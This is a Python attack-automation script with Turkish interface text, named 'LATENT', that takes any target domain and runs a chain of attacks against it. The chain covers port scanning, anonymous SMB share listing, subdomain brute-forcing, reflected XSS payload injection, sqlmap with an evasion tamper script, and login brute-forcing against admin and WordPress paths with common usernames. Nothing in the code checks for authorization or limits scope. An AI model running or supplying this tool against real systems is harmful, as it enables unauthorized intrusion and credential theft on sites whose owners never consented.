#!/usr/bin/env python3
import os
import sys
import subprocess
import requests
import socket
import json
import time
from datetime import datetime
from urllib.parse import urlparse

BANNER = """
===============================================================
                     LATENT - YOU CANT BEAT ME
===============================================================
"""

def log(msg, level="INFO"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] [{level}] {msg}")

def write_report(f, msg, level="INFO"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    f.write(f"[{timestamp}] [{level}] {msg}\n")

def print_header(text):
    print(f"\n{'='*60}")
    print(f"  {text}")
    print(f"{'='*60}")

def ask_questions():
    print(BANNER)
    print("[*] Hedef domaini girin (orn: example.com veya http://example.com):")
    target = input(">>> ").strip()

    if not target.startswith("http"):
        target = "http://" + target
    parsed = urlparse(target)
    domain = parsed.netloc if parsed.netloc else parsed.path

    print("\n[*] Wordlist dosyasinin tam yolunu girin (ornek: /usr/share/wordlists/rockyou.txt):")
    wordlist = input(">>> ").strip()
    while not os.path.isfile(wordlist):
        print("[!] Dosya bulunamadi. Tekrar deneyin:")
        wordlist = input(">>> ").strip()

    print("\n[*] Port taramasi icin max port numarasi (default: 1000):")
    max_port = input(">>> ").strip()
    max_port = int(max_port) if max_port.isdigit() else 1000

    print("\n[*] Brute force denemesi yapilsin mi? (e/h) [default: h]:")
    bf = input(">>> ").strip().lower()
    do_bruteforce = bf == "e"

    print("\n[*] SQLMap taramasi yapilsin mi? (e/h) [default: e]:")
    sql = input(">>> ").strip().lower()
    do_sqlmap = sql != "h"

    print("\n[*] Subdomain taramasi limiti kac olsun? (default: 50, 0=tumunu tara):")
    sub_limit = input(">>> ").strip()
    sub_limit = int(sub_limit) if sub_limit.isdigit() else 50

    return domain, wordlist, max_port, do_bruteforce, do_sqlmap, sub_limit

def fetch_html(domain, report):
    print_header("PHASE 1: HTML FETHI")
    urls_to_try = [
        f"http://{domain}",
        f"https://{domain}",
        f"http://www.{domain}",
        f"https://www.{domain}"
    ]

    fetched = False
    for url in urls_to_try:
        try:
            log(f"{url} deneniyor...")
            r = requests.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"}, verify=False)
            log(f"HTTP {r.status_code} - {len(r.text)} byte alindi.")
            html_file = f"{domain}_index.html"
            with open(html_file, "w", encoding="utf-8") as f:
                f.write(r.text)
            log(f"HTML kaydedildi: {html_file}")
            write_report(report, f"HTML {r.status_code} - {len(r.text)} bytes from {url}")
            fetched = True
            return r.text, html_file
        except Exception as e:
            log(f"Basarisiz: {url} -> {e}", "WARN")

    if not fetched:
        log("HTML alinamadi.", "FAIL")
        write_report(report, "HTML fetch FAILED")
        return None, None

def scan_ports(domain, max_port, report):
    print_header("PHASE 2: PORT TARAMASI")
    open_ports = []

    log(f"Port taramasi basladi (1-{max_port})...")

    for port in range(1, max_port + 1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            result = s.connect_ex((domain, port))
            if result == 0:
                service = "unknown"
                try:
                    service = socket.getservbyport(port)
                except:
                    pass
                log(f"PORT {port}/{service} ACIK")
                write_report(report, f"PORT {port}/{service} ACIK")
                open_ports.append((port, service))
            s.close()
        except KeyboardInterrupt:
            log("Port taramasi kullanici tarafindan durduruldu.", "WARN")
            break
        except:
            pass

    write_report(report, f"Toplam {len(open_ports)} acik port bulundu.")
    return open_ports

def smb_check(domain, report):
    print_header("PHASE 3: SMB KONTROLU")
    smb_ports = [139, 445]
    smb_found = []

    for port in smb_ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            if s.connect_ex((domain, port)) == 0:
                log(f"SMB portu {port} ACIK")
                write_report(report, f"SMB port {port} ACIK")
                smb_found.append(port)
            s.close()
        except:
            pass

    if smb_found:
        log("SMB servisi tespit edildi. Enum4linux onerilir.")
        write_report(report, "SMB servisi tespit edildi.")
        try:
            result = subprocess.run(
                ["smbclient", "-L", f"//{domain}/", "-N"],
                capture_output=True, text=True, timeout=10
            )
            if result.stdout:
                log("SMB share listesi alindi.")
                write_report(report, f"SMB Shares:\n{result.stdout}")
        except:
            log("smbclient calistirilamadi.", "WARN")
            write_report(report, "smbclient failed")
    else:
        log("SMB portlari kapali.")
        write_report(report, "SMB ports closed")

def subdomain_scan(domain, wordlist, report, limit):
    print_header("PHASE 4: SUBDOMAIN KESFI")
    found_subs = []
    count = 0

    log(f"Subdomain taramasi basladi. Wordlist: {wordlist}")

    try:
        with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
            for line in f:
                sub = line.strip()
                if not sub or sub.startswith("#"):
                    continue

                full_domain = f"{sub}.{domain}"
                try:
                    ip = socket.gethostbyname(full_domain)
                    log(f"SUBDOMAIN: {full_domain} -> {ip}")
                    write_report(report, f"SUBDOMAIN: {full_domain} -> {ip}")
                    found_subs.append((full_domain, ip))
                    count += 1
                except:
                    pass

                if limit > 0 and count >= limit:
                    log(f"{limit} subdomain bulundu, tarama durduruluyor.")
                    write_report(report, f"Subdomain limit reached ({limit})")
                    break
    except Exception as e:
        log(f"Subdomain taramasi basarisiz: {e}", "FAIL")
        write_report(report, f"Subdomain scan error: {e}")

    write_report(report, f"Toplam {len(found_subs)} subdomain bulundu.")
    return found_subs

def xss_test(domain, report):
    print_header("PHASE 5: XSS TESTI")

    test_pages = [
        f"http://{domain}",
        f"http://{domain}/search",
        f"http://{domain}/contact",
        f"http://{domain}/login",
        f"http://{domain}/index.php",
        f"https://{domain}",
        f"https://{domain}/search",
        f"https://{domain}/contact",
    ]

    xss_payloads = [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"><img src=x onerror=alert(1)>",
    ]

    tested = 0
    for page in test_pages:
        try:
            r = requests.get(page, timeout=5, verify=False, headers={"User-Agent": "Mozilla/5.0"})
            if "<form" in r.text.lower() or "input" in r.text.lower():
                log(f"Form bulundu: {page} - XSS testi yapiliyor...")
                write_report(report, f"Testing XSS on: {page}")

                for payload in xss_payloads:
                    try:
                        test_url = f"{page}?q={payload}&search={payload}&name={payload}"
                        r2 = requests.get(test_url, timeout=5, verify=False, headers={"User-Agent": "Mozilla/5.0"})
                        if payload in r2.text:
                            log(f"XSS MUHTEMEL: {test_url}")
                            write_report(report, f"XSS POSSIBLE: {test_url}")
                        tested += 1
                    except:
                        pass
        except:
            pass

    write_report(report, f"XSS testleri tamamlandi. {tested} deneme.")

def sqlmap_scan(domain, report):
    print_header("PHASE 6: SQLMAP TARAMASI")

    targets = [
        f"http://{domain}",
        f"https://{domain}",
    ]

    for target_url in targets:
        log(f"SQLMap baslatiliyor: {target_url}")
        write_report(report, f"SQLMap target: {target_url}")

        cmd = [
            "sqlmap", "-u", target_url,
            "--batch",
            "--random-agent",
            "--level", "2",
            "--risk", "2",
            "--threads", "4",
            "--time-sec", "5",
            "--output-dir", f"./sqlmap_{domain}",
            "--tamper", "space2comment",
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if result.stdout:
                log("SQLMap ciktisi alindi.")
                with open(f"{domain}_sqlmap.txt", "w") as sf:
                    sf.write(result.stdout)
                write_report(report, f"SQLMap output saved. Length: {len(result.stdout)} chars")

                if "vulnerable" in result.stdout.lower() or "injectable" in result.stdout.lower():
                    log("SQL ZAFIYETI BULUNDU!", "FAIL")
                    write_report(report, "SQL INJECTION VULNERABILITY DETECTED!", "FAIL")
                else:
                    log("SQLMap taramasi tamamlandi, zafiyet bulunamadi.")
                    write_report(report, "SQLMap: No obvious injection found")
        except subprocess.TimeoutExpired:
            log("SQLMap zaman asimi (5 dk)", "WARN")
            write_report(report, "SQLMap timeout")
        except FileNotFoundError:
            log("sqlmap bulunamadi. apt install sqlmap ile yukleyin.", "FAIL")
            write_report(report, "sqlmap not installed")
        except Exception as e:
            log(f"SQLMap hatasi: {e}", "WARN")
            write_report(report, f"SQLMap error: {e}")

def bruteforce_check(domain, wordlist, report):
    print_header("PHASE 7: BRUTE FORCE DENEMESI")
    log("Basit brute force basliyor...")
    write_report(report, "Brute force basladi.")

    login_paths = ["/login", "/admin", "/wp-login.php", "/administrator", "/user/login"]
    common_users = ["admin", "root", "user", "test", "administrator"]

    try:
        with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
            passwords = [line.strip() for line in f.readlines()[:100]]
    except:
        passwords = ["123456", "password", "admin", "1234", "root"]

    for path in login_paths:
        url = f"http://{domain}{path}"
        log(f"Brute force: {url}")
        write_report(report, f"Brute force target: {url}")

        for user in common_users:
            for pwd in passwords[:5]:
                try:
                    r = requests.post(
                        url,
                        data={"username": user, "password": pwd, "log": user, "pwd": pwd},
                        timeout=5,
                        verify=False,
                        headers={"User-Agent": "Mozilla/5.0"}
                    )

                    if r.status_code == 200 and ("error" not in r.text.lower()[:500] and "invalid" not in r.text.lower()[:500] and "wrong" not in r.text.lower()[:500]):
                        if len(r.text) > 100:
                            log(f"OLASILIK: {user}:{pwd} -> {url}")
                            write_report(report, f"POSSIBLE CRED: {user}:{pwd} at {url}")
                except:
                    pass

    write_report(report, "Brute force tamamlandi.")

def main():
    domain, wordlist, max_port, do_bruteforce, do_sqlmap, sub_limit = ask_questions()

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_filename = f"latent_report_{domain}_{timestamp}.txt"

    with open(report_filename, "w") as report:
        write_report(report, f"LATENT Pentest Report - {domain}")
        write_report(report, f"Baslangic: {datetime.now().isoformat()}")
        write_report(report, f"Wordlist: {wordlist}")
        write_report(report, f"Max Port: {max_port}")
        write_report(report, f"Brute Force: {do_bruteforce}")
        write_report(report, f"SQLMap: {do_sqlmap}")
        write_report(report, f"Subdomain Limit: {sub_limit}")
        write_report(report, "=" * 60)

        html, html_file = fetch_html(domain, report)

        open_ports = scan_ports(domain, max_port, report)

        smb_check(domain, report)

        found_subs = subdomain_scan(domain, wordlist, report, sub_limit)

        xss_test(domain, report)

        if do_sqlmap:
            sqlmap_scan(domain, report)

        if do_bruteforce:
            bruteforce_check(domain, wordlist, report)

        write_report(report, "=" * 60)
        write_report(report, "OZET")
        write_report(report, f"Acik Port: {len(open_ports)}")
        write_report(report, f"Subdomain: {len(found_subs)}")
        write_report(report, f"HTML Kayit: {html_file if html else 'YOK'}")
        write_report(report, f"Bitis: {datetime.now().isoformat()}")
        write_report(report, "=" * 60)

    print_header("TAMAMLANDI")
    print(f"[*] Rapor dosyasi: {report_filename}")
    print(f"[*] HTML kaydi: {html_file if html else 'YOK'}")
    print(f"[*] Acik port: {len(open_ports)}")
    print(f"[*] Subdomain: {len(found_subs)}")
    print(f"[*] SQLMap ciktisi: sqlmap_{domain}/")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Kullanici tarafindan durduruldu.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Beklenmeyen hata: {e}")
        sys.exit(1)
